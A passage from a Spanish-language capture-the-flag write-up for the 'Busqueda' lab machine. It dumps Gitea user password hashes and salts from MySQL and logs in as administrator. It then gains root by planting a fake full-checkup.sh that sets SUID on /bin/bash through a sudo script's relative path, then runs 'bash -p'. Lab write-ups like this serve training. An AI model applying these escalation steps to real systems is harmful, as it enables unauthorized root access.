| oauth2_grant              |
| org_user                  |
| package                   |
| package_blob              |
| package_blob_upload       |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
91 rows in set (0.01 sec)
```

Al enumerar los valores de la tabla `users`, nos encontramos con las credenciales del usuario `administrator` para `Gitea`.

```bash
mysql> SELECT * FROM user;
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
| id | lower_name    | name          | full_name | email                            | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands                            | salt                             | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar | avatar_email                     | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme | keep_activity_private |
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
|  1 | administrator | administrator |           | administrator@gitea.searcher.htb |                  0 | enabled                        | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 44748ed806accc9d96bf9f495979b742 | a378d3f64143b284f104c926b8b49dfb | en-US    |             |   1672857920 |   1680531979 |      1673083022 |                    1 |                -1 |         1 |        1 |             0 |              0 |                  0 |                         1 |              0 |        | administrator@gitea.searcher.htb |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
|  2 | cody          | cody          |           | cody@gitea.searcher.htb          |                  0 | enabled                        | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 304b5a2ce88b6d989ea5fae74cc6b3f3 | d1db0a75a18e50de754be2aafcad5533 | en-US    |             |   1672858006 |   1680532283 |      1680532243 |                    1 |                -1 |         1 |        0 |             0 |              0 |                  0 |                         1 |              0 |        | cody@gitea.searcher.htb          |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
2 rows in set (0.00 sec)
```

### Accessing on Gitea with Administrator's user

Volvimos a nuestro equipo local donde tenemos acceso al `Gitea` mediante **Port Forwarding**. Probamos de acceder con las credenciales del usuario `Administrator` localizadas en el punto anterior y comprobamos del acceso correspondiente. También, logramos verificar que disponíamos de un repositorio llamado `scripts`.&#x20;

<figure><img src="../../.gitbook/assets/imagen (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al acceder al repositorio de `scripts`, logramos visualizar diferentes archivos/scripts que parecen ser los que se encontraban en `/opt/scripts` que inicialmente no podíamos visualizar su contenido.

El primer script que logramos visualizar es el de `check-ports.py` el cual después de revisarlo, no logramos sacar nada relevante.

<figure><img src="../../.gitbook/assets/imagen (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se muestra el contenido de `full-checkup.sh`.

<figure><img src="../../.gitbook/assets/imagen (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Contenido del script `install-flask.sh`

<figure><img src="../../.gitbook/assets/imagen (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Contenido del script `system-checkup.py`.

<figure><img src="../../.gitbook/assets/imagen (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Relative Path Exploitation in Script

Después de una revisión exhaustiva de los scripts encontrados, nos encontramos que el script `full-checkup.sh` podíamos llegar a obtener acceso como root debido a una mala configuración.

En el archivo del script, se mencionaba la función `full-checkup` en la cual probaba de ejecutar un script llamado `full-checkup.sh`. De la manera que está representado este valor, no se le indica la ruta absoluta del archivo de Bash, con lo cual nos puede permitir crear un archivo con el mismo nombre que realice otra acción que deseemos. Recordemos que este script lo ejecutamos como usuario `sudo`, con lo cual podríamos llegar a modificar archivos, etc para lograr acceso al sistema.

<figure><img src="../../.gitbook/assets/imagen (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo tanto, decidimos de crear un archivo llamado `full-checkup.sh` que lo que realizaría es otorgar al binario `/bin/bash` permisos de `SUID`.

Al ejecutar el script con la función `full-checkup`, al disponer del script malicioso en el mismo repositorio, se nos indicó el mensaje de `Done`.

Revisamos los permisos de `/bin/bash` y comprobamos que tiene permisos de `SUID`. Nos aprovechamos de esto para convertirnos en usuario`root` y visualizar la flag de **root.txt**.

```bash
svc@busqueda:/tmp$ ls -l full-checkup.sh 
-rwxr-xr-x 1 svc svc 33 Feb 13 06:07 full-checkup.sh
svc@busqueda:/tmp$ cat full-checkup.sh 
#!/bin/bash

chmod u+s /bin/bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:/tmp$ bash -p
bash-5.1$ whoami
root
bash-5.1$ cat /root/root.txt 
219cc898cfb2*********************
```
